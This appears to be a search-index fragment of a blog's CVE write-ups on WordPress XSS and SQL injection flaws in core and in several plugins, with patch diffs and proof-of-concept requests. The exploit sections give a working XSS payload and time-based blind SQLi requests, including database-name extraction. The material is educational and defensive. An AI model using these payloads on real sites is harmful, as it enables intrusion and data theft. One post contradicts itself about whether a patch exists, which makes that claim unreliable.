Absolute path to the plugin directory\r","date":"2025-10-02","objectID":"/posts/2025-10-02-cve-2025-6234/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/posts/2025-10-02-cve-2025-6234/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\rRequest with XSS payload GET /wp-admin/admin.php?page=wphostel_bookings\u0026type=upcoming\u0026offset=1\u0026ob=\"\u003e\u003cimg+src%3D1+onerror%3Dalert%28document.domain%29\u003e HTTP/1.1 Payload \"\u003e\u003cimg src=x onerror=alert(document.domain)\u003e Closes \u003ca\u003e tag with \"\u003e Adds \u003cimg\u003e tag with onerror to trigger JavaScript Uses alert(document.domain) to clearly demonstrate DOM access Result Reflected XSS triggered successfully\r","date":"2025-10-02","objectID":"/posts/2025-10-02-cve-2025-6234/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/posts/2025-10-02-cve-2025-6234/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe CVE-2025-6234 vulnerability in the WordPress Hostel plugin stems from improper handling of input ($_GET['ob']) before rendering. This allows an attacker to inject Reflected XSS. The patch fixes it by using esc_attr() to escape the input, ensuring untrusted values cannot inject malicious scripts. Key takeaways: Always sanitize input and escape output according to context. In WordPress, leverage built-in functions like sanitize_text_field(), esc_attr(), esc_html(), wp_kses() to mitigate security risks. ","date":"2025-10-02","objectID":"/posts/2025-10-02-cve-2025-6234/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/posts/2025-10-02-cve-2025-6234/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rXSS Cross-site scripting (XSS) cheat sheet - PortSwigger WordPress Hostel Plugin \u003c 1.1.5.8 is vulnerable to Cross Site Scripting (XSS) - patchstack ","date":"2025-10-02","objectID":"/posts/2025-10-02-cve-2025-6234/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/posts/2025-10-02-cve-2025-6234/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Core.","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analysis"],"collections":null,"content":"Due to improper data sanitization in WP_Query, it is possible in certain cases to perform an SQL Injection through plugins or themes that use it in a particular way. This vulnerability was patched in WordPress version 5.8.3. Older affected versions were also fixed through security releases going back as far as 3.7.37. CVE ID: CVE-2022-21661 Product: WordPress Vulnerability Type: SQL Injection Affected Versions: 3.7.37 ≤ version \u003c 5.8.3 CVSS severity: High (8.0) ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. WordPress: v5.8.2 (vulnerable) ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Setup\r","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#setup"},{"categories":["CVE Analysis"],"collections":null,"content":"Required PHP Version\rWordPress is entirely built in PHP, so the PHP version on the server directly affects its operation: Each PHP version introduces new features and deprecates or removes outdated syntax/functions. If WordPress uses features not supported by an old PHP version → syntax errors or execution failure may occur. Conversely, if PHP is too new, some older functions used by WordPress might be deprecated or removed, causing runtime errors. 👉 Therefore, the PHP version must be compatible with the WordPress version. In this analysis, we use PHP 7.4 with WordPress 5.8.2. ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#required-php-version"},{"categories":["CVE Analysis"],"collections":null,"content":"VSCode Extensions\rBecause WordPress source code is complex, reading it line by line manually is not practical. To assist with debugging and tracing, install the following extensions in VS Code: PHP Extension Pack → search keyword: xdebug.php-pack PHP Tools for VS Code → search keyword: devsense.phptools-vscode ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#vscode-extensions"},{"categories":["CVE Analysis"],"collections":null,"content":"Custom Plugin\rSince this SQLi vulnerability affects the WordPress Core but can only be exploited indirectly through plugins or themes that use WP_Query, we must interact with it via such a plugin or theme. We create a plugin using WP_Query, displaying the SQL query executed through WP_Query::request. \u003c?php /** * Plugin Name: Demo WP_Query * Description: Demo plugin for WP_Query * Version: 1.0 * Author: w41bu1 */ if (!defined('ABSPATH')) exit; function da_show_posts() { $args = [ 'post_type' =\u003e 'post', 'tax_query' =\u003e [ [ 'taxonomy' =\u003e 'category', 'field' =\u003e 'term_taxonomy_id', 'terms' =\u003e [1,2,3], 'operator' =\u003e 'IN', ], ], ]; $query = new WP_Query($args); ob_start(); echo '\u003ch3\u003eDemo WP_Query\u003c/h3\u003e'; echo '\u003cpre style=\"background:#f0f0f0; padding:15px; width:100%; white-space:pre-wrap; word-wrap:break-word; overflow:auto;\"\u003e'; echo \"SQL query generated by WP_Query:\\n\\n\"; echo esc_html($query-\u003erequest); echo '\u003c/pre\u003e'; if ($query-\u003ehave_posts()) { echo '\u003cul\u003e'; while ($query-\u003ehave_posts()) { $query-\u003ethe_post(); echo '\u003cli\u003e' . get_the_title() . ' (' . get_the_ID() . ')\u003c/li\u003e'; } echo '\u003c/ul\u003e'; } else { echo '\u003cp\u003eNo posts found.\u003c/p\u003e'; } wp_reset_postdata(); return ob_get_clean(); } add_shortcode('demo_wp_query', 'da_show_posts'); Taxonomy parameters Create a new page with \u003cpage-title\u003e containing the shortcode: [demo_wp_query] 👉 The query will be displayed when visiting http://localhost/\u003cpage-title\u003e Demo page displaying WP_Query output\r","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:2:3","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#custom-plugin"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rwpdb Core PHP class used by WordPress to directly interact with MySQL. Allows developers to write and execute raw SQL queries. WP_Query An abstraction layer that retrieves post data from the database without writing raw SQL. Developers simply pass an array of parameters (args), and WordPress automatically builds the appropriate SQL. Relationship WP_Query doesn’t directly query MySQL. Instead, it builds SQL based on the arguments, applies validation/sanitization, and then calls $wpdb to execute it. ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rWordPress is an open-source project with a public GitHub repository, meaning all patches are committed openly. To analyze a vulnerability, we can simply review the related commit and observe the code changes. The reference for CVE-2022-21661 links to this commit: Patch diff between versions\rThe vulnerability was fixed in src/wp-includes/class-wp-tax-query.php Vulnerable Code $query['terms'] = array_unique( (array) $query['terms'] ); Casts $query['terms'] to an array and removes duplicates. No type checking or sanitization — allowing injection of malicious values into the SQL query. Example: $args = [ 'post_type' =\u003e 'post', 'tax_query' =\u003e [ [ 'taxonomy' =\u003e 'category', 'field' =\u003e 'term_taxonomy_id', 'terms' =\u003e ['1) AND (SELECT SLEEP(5)) # '], 'operator' =\u003e 'IN', ], ], ]; Patched Code if ( 'slug' === $query['field'] || 'name' === $query['field'] ) { $query['terms'] = array_unique( (array) $query['terms'] ); } else { $query['terms'] = wp_parse_id_list( $query['terms'] ); } Added a conditional check based on $query['field']: If it’s slug or name → keep the old behavior. If it’s an ID → use wp_parse_id_list() to cast all elements into an integer array safely. This ensures that for tax_query fields such as term_taxonomy_id and term_id, which correspond to BIGINT UNSIGNED columns, only numeric values are used. mysql\u003e DESC wp_term_taxonomy; +------------------+-----------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +------------------+-----------------+------+-----+---------+----------------+ | term_taxonomy_id | bigint unsigned | NO | PRI | NULL | auto_increment | | term_id | bigint unsigned | NO | MUL | 0 | | | taxonomy | varchar(32) | NO | MUL | | | | description | longtext | NO | | NULL | | | parent | bigint unsigned | NO | | 0 | | | count | bigint | NO | | 0 | | +------------------+-----------------+------+-----+---------+----------------+ ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works\rBreakpoint at clean_query start\rContinue to matching taxonomy query\rObserve wp_list_pluck overwriting terms\rPrevent overwrite with early return\rPayload remains in executed query\rFlow\rWP_Query object created\rWP_Query constructor called\rget_posts invoked to run query\rCondition satisfied, get_sql called\rget_sql returns get_sql_clauses\rget_sql_clauses calls get_sql_for_query\rIterate query array in get_sql_for_query\rChecks terms, taxonomy, operator keys...\rCalls get_sql_for_clause\rBypass clean_query, payload preserved\rPayload assigned to $sql\\['where']\rParentheses added to WHERE clause\rAdds AND and returns SQL\rget_posts receives SQL\rPayload merged into $clauses\\['where']\rObserve last_query where SQL executes\rExecution Flow Diagram Execution flow of WP_Query leading to SQLi\r","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works\rBreakpoint at clean_query start\rContinue to matching taxonomy query\rObserve wp_list_pluck overwriting terms\rPrevent overwrite with early return\rPayload remains in executed query\rFlow\rWP_Query object created\rWP_Query constructor called\rget_posts invoked to run query\rCondition satisfied, get_sql called\rget_sql returns get_sql_clauses\rget_sql_clauses calls get_sql_for_query\rIterate query array in get_sql_for_query\rChecks terms, taxonomy, operator keys...\rCalls get_sql_for_clause\rBypass clean_query, payload preserved\rPayload assigned to $sql\\['where']\rParentheses added to WHERE clause\rAdds AND and returns SQL\rget_posts receives SQL\rPayload merged into $clauses\\['where']\rObserve last_query where SQL executes\rExecution Flow Diagram Execution flow of WP_Query leading to SQLi\r","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\rReplace terms value with an SQLi payload: GET /demo/?terms=1)+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a)+%23+ HTTP/1.1 Response shows delay caused by payload execution\r","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe CVE-2022-21661 vulnerability in WordPress Core, prior to version 5.8.3 (affecting versions back to 3.7.37), stems from improper sanitization in WP_Query, leading to a potential SQL Injection vulnerability. ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSQL Injection cheat sheet - PortSwigger CVE-2022-21661 Detail ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:6:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Notes\r","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:7:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#notes"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Depicter Slider Plugin.","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/"},{"categories":["CVE Analysis"],"collections":null,"content":"The vulnerability occurs in the Depicter Slider WordPress plugin prior to version 3.6.2. This could allow an attacker to directly interact with your database, potentially leading to data theft or manipulation. CVE ID: CVE-2025-2011 Product: WordPress Depicter Slider Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 3.6.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated ","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Depicter Slider: v3.6.1 (vulnerable) and v3.6.2 (patched) Diff tool: meld or any other comparison tool to visualize differences between versions ","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rThe root cause is that the application directly injects data from a GET request into the SQL query without proper sanitization or escaping. ","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rUse any diff tool to compare the vulnerable and patched versions. A notable difference appears in app/src/Controllers/Ajax/LeadsAjaxController.php. index, list, and export are three key functions inside the LeadsAjaxController class. public function index(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::lead()-\u003eget($args); $statusCode = isset($response['errors']) ? 400 : 200; return \\Depicter::json($response)-\u003ewithStatus($statusCode); } public function list(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::leadRepository()-\u003egetResults($args); return \\Depicter::json($response); } public function export(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::leadRepository()-\u003egetResults($args); // other logic return \\Depicter::json([ 'errors' =\u003e [__('error occurred during the export process', 'depicter')] ])-\u003ewithStatus(400); } All three functions were patched by replacing Sanitize::textfield with Sanitize::sql, ensuring the 's' parameter is properly sanitized and SQL-escaped. Illustration of patched vs vulnerable code differences\r","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works\rTo understand how textfield and sql functions behave, search for the keyword function textfield. They likely reside in the same file since both are called from the same class Sanitize. If you have the PHP Intelephense Extension installed in VSCode, you can navigate directly to the function definition using Ctrl + Click. Searching for textfield function in Sanitize class\rtextfield returns data sanitized by sanitize_text_field, while sql returns SQL-escaped data using esc_sql(). public static function sql( $input ) { return esc_sql( $input ); } Since this is an unauthenticated vulnerability, we need to identify which of the three functions are called without any authentication mechanism. Once confirmed, we can trace deeper into the logic to verify potential SQL injection exploitation. Searching directly by function names like index, list, or export may yield too many results. Instead, search for the class name LeadsAjaxController since all functions must be invoked through it. Searching for LeadsAjaxController usage in source code\r👉 The LeadsAjaxController is used during Ajax route registration. When a request is sent to /wp-admin/admin-ajax.php?action=action_here\u0026param1=..., WordPress maps the request via handle('LeadsAjaxController@function') to the corresponding method. All three functions are invoked using the GET method, but export includes a csrf-api middleware, so we can exclude it. We’ll focus only on index and list. When analyzing index, we see that $response calls \\Depicter::lead()-\u003eget($args), which internally calls \\Depicter::leadRepository()-\u003egetResults($args). This is the same logic as list, so list is our main tracing point. public function list(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), 'ids' =\u003e Sanitize::textfield($request-\u003equery('ids', '')), 'sources' =\u003e Sanitize::textfield($request-\u003equery('sources', '')), 'dateStart' =\u003e Sanitize::textfield($request-\u003equery('dateStart', '')), 'dateEnd' =\u003e Sanitize::textfield($request-\u003equery('dateEnd', '')), 'order' =\u003e Sanitize::textfield($request-\u003equery('order', 'DESC')), 'orderBy' =\u003e Sanitize::textfield($request-\u003equery('orderBy', 'id')), 'page' =\u003e Sanitize::int($request-\u003equery('page', 1)), 'perPage' =\u003e Sanitize::int($request-\u003equery('perpage', 10)), 'columns' =\u003e Sanitize::textfield($request-\u003equery('columns', '')), 'includeFields' =\u003e Sanitize::textfield($request-\u003equery('includeFields', false)), 'skipCustomFields' =\u003e Sanitize::textfield($request-\u003equery('skipCustomFields', false)) ]; $response = \\Depicter::leadRepository()-\u003egetResults($args); return \\Depicter::json($response); } To understand how getResults executes its query, search for function getResults or use Ctrl + Click on getResults. Definition of getResults function in LeadRepository class\r👉 Two getResults functions appear. Based on the class name LeadRepository and the leadRepository() function, it’s likely that Depicter::leadRepository() returns an instance of LeadRepository. The correct function can be confirmed by checking the number of parameters. The if condition shows that when includeFields is empty, getLeadsResults is called. Let’s look at it: protected function getLeadsResults( $args ){ // Purpose of joining tables is being able to search in leadField values as well $leadTable = $this-\u003elead()-\u003egetTable(); $leads = Lead::new()-\u003eselect( \"{$leadTable}.id\", \"{$leadTable}.source_id\", \"{$leadTable}.content_id\", \"{$leadTable}.content_name\", \"{$leadTable}.created_at\", \"lf.name as fieldName\", \"lf.value as fieldValue\" )-\u003ejoin( \"{$this-\u003eleadField()-\u003egetTable()} AS lf\", \"{$leadTable}.id\", \"=\", \"lf.lead_id\" ); // other logic if( ! empty( $args['s'] ) ){ $search = \"'%\". $args['s'] .\"%'\"; $leads-\u003eappendRawWhere('AND', \"( lf.value like {$search} OR {$leadTable}.content_name like {$search} )\"); } $results = $this-\u003epaginate( $leads, $args ); } Here, the s parameter (which the patch protects) is concatenated directly into the query using appendRawWhere. Part of t","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect SQLi\rSend a GET request with a time-based SQLi payload: GET /wp-admin/admin-ajax.php?action=depicter-lead-list\u0026s=999%25'+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a))+--+-+ HTTP/1.1 Host: localhost ... Cookie: cookie_here Decoded payload: 999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- - This makes part of the query: AND (lf.value like '999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- ' OR leadtable.content_name like '999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) #') Response time showing the payload execution\r👉 The delayed response confirms the injection worked. Subquery in FROM clause: The subquery acts as a temporary table, forcing MySQL to execute it first, delaying the main query execution. ","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/#detect-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Get First Letter of Database Name\rTo fully dump data, we must first confirm we can extract at least one character of the database name. Send a request with the following SQLi payload: GET /wp-admin/admin-ajax.php?action=depicter-lead-list\u0026s=999%25'+AND+(SELECT+1+FROM+(SELECT+IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1))a))+--+-+ HTTP/1.1 Host: localhost ... Cookie: cookie_here SUBSTRING() extracts the first letter of the database name, and IF() triggers SLEEP(5) if the first character equals 0x77 ('w'). Hex encoding (0x77) is used because s originates from a GET parameter and is escaped by magic quotes and sanitize_text_field in WordPress. 👉 The delayed response confirms the first character is indeed w. ","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/#get-first-letter-of-database-name"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe CVE-2025-2011 vulnerability in the WordPress Depicter Slider plugin (prior to version 3.6.2) arises from unvalidated user input being directly injected into SQL queries, leading to SQL Injection. The patch introduces SQL escaping, ensuring injected data is safely encapsulated within '%...%' strings. Key takeaways: Always validate and sanitize user input. Use $wpdb-\u003eprepare() when handling database queries in WordPress. Keep plugins updated and conduct regular security audits to reduce exposure. ","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSQL Injection Cheat Sheet - PortSwigger WordPress Depicter Slider Plugin \u003c= 3.6.1 is vulnerable to SQL Injection ","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Woocommerce Partial Shipment Plugin.","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/"},{"categories":["CVE Analysis"],"collections":null,"content":"The vulnerability occurs in the Woocommerce Partial Shipment plugin for WordPress prior to version 3.3. It allows attackers to directly interact with the database, potentially leading to data theft and other attacks. CVE ID: CVE-2025-48118 Product: WordPress Woocommerce Partial Shipment Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 3.2 CVSS Severity: High (8.5) Required Privilege: Subscriber ","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Woocommerce Partial Shipment: v3.2 (vulnerable) and v3.3 (patched) Diff Tool: meld or any comparison tool to view differences between versions Activated WooCommerce Plugin: must be activated before installing Woocommerce Partial Shipment Plugin, since several WooCommerce functions are used. ","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rThe root cause lies in directly injecting POST request data into an SQL query without proper sanitization or validation. ","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rUse any diff tool to compare the vulnerable and patched versions. A significant difference appears in wc-partial-shipment/woocommerce-partial-shipment.php. However, since the developer made many changes, locating the vulnerable line can be difficult. In WordPress, for SQLi to occur, the application must interact with the database using the global variable $wpdb. Searching for this keyword inside wc-partial-shipment/woocommerce-partial-shipment.php helps identify possible sinks. Sink location found in source code\rget_shipment_id and get_wxp_shipment_data are two functions in the WXP_Partial_Shipment class that directly insert user input into SQL queries without validation, making them vulnerable to SQL Injection. Comparison between vulnerable and patched version\rThe patch uses $wpdb-\u003eprepare() to safely construct SQL queries instead of direct string concatenation with user input. This ensures all values are properly escaped before being inserted into the SQL query, effectively mitigating SQL Injection risks. ","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works\rBoth get_shipment_id and get_wxp_shipment_data are called by the function wxp_order_set_shipped within the same class. function wxp_order_set_shipped(){ $order_id = isset($_POST['order_id']) ? $_POST['order_id'] : 0; // other logic $wxp_shipment = $this-\u003eget_wxp_shipment_data($order_id); if(isset($_POST['order_id']) \u0026\u0026 $_POST['order_id']){ global $wpdb; $shipment_id = $this-\u003eget_shipment_id($_POST['order_id']); if(!$shipment_id){ $data = array( 'order_id' =\u003e$order_id, 'shipment_id' =\u003e1, 'shipment_url'=\u003e'', 'shipment_num'=\u003e'', 'shipment_date'=\u003ecurrent_time('timestamp',0), ); $wpdb-\u003einsert($wpdb-\u003eprefix.\"partial_shipment\",$data,array('%d','%d','%s','%s','%s')); $shipment_id = $wpdb-\u003einsert_id; } // other logic } echo json_encode(array('order_id'=\u003e$order_id,'status'=\u003e$status_key)); exit(); } 👉 The order_id parameter is taken directly from the POST request, making it user-controlled and allowing it to be passed into vulnerable SQL queries within get_shipment_id and get_wxp_shipment_data. To find where wxp_order_set_shipped is called, search for the keyword wxp_order_set_shipped inside the plugin directory. Location of wxp_order_set_shipped function call\rwxp_order_set_shipped is registered in the class constructor as a callback for the wp_ajax_wxp_order_set_shipped hook, meaning it can be triggered by authenticated users. 👉 Accessing /wp-admin/admin-ajax.php with the parameters: action=wxp_order_set_shipped\u0026order_id=payload_here will trigger the following: The callback wxp_order_set_shipped executes. order_id is taken directly from the request and inserted into SQL queries. The query executes twice due to its usage in two separate SQL calls containing the malicious payload. ","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detecting SQLi\rSend a POST request containing an SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) This results in the query: SELECT id as ship_id FROM wp_partial_shipment WHERE order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Because the query executes twice, the response time doubles. Response time after successful exploitation\rA subquery in the FROM clause is used because MySQL treats it as a temporary table. The subquery executes once to create the temporary table, and the main query runs afterward. This ensures the SLEEP function runs only once instead of being multiplied across multiple comparisons. For example, using the following payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026order_id=(SELECT SLEEP(5)) The response time increases exponentially. Exponential response time increase\r","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/#detecting-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Extracting the First Letter of the Database Name\rThe first step in data extraction is confirming at least one character of the database name — once retrieved, the rest can be dumped easily. Send a request with the following SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026order_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) Here, SUBSTRING() extracts the first letter of the database name, and IF() triggers SLEEP(5) if it equals 0x77 (‘w’). Hex encoding (0x77) is used for 'w' because the order_id parameter, being a POST value, is escaped by magic quotes and sanitize_text_field in WordPress. 👉 Based on the delayed response, we confirm that the first character is 'w'. ","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/#extracting-the-first-letter-of-the-database-name"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe CVE-2025-48118 vulnerability in the WordPress Woocommerce Partial Shipment plugin (versions before 3.3) originates from directly inserting unsanitized user input into SQL queries, resulting in a SQL Injection vulnerability. No official patch has been released at the time of writing. Key Takeaways: 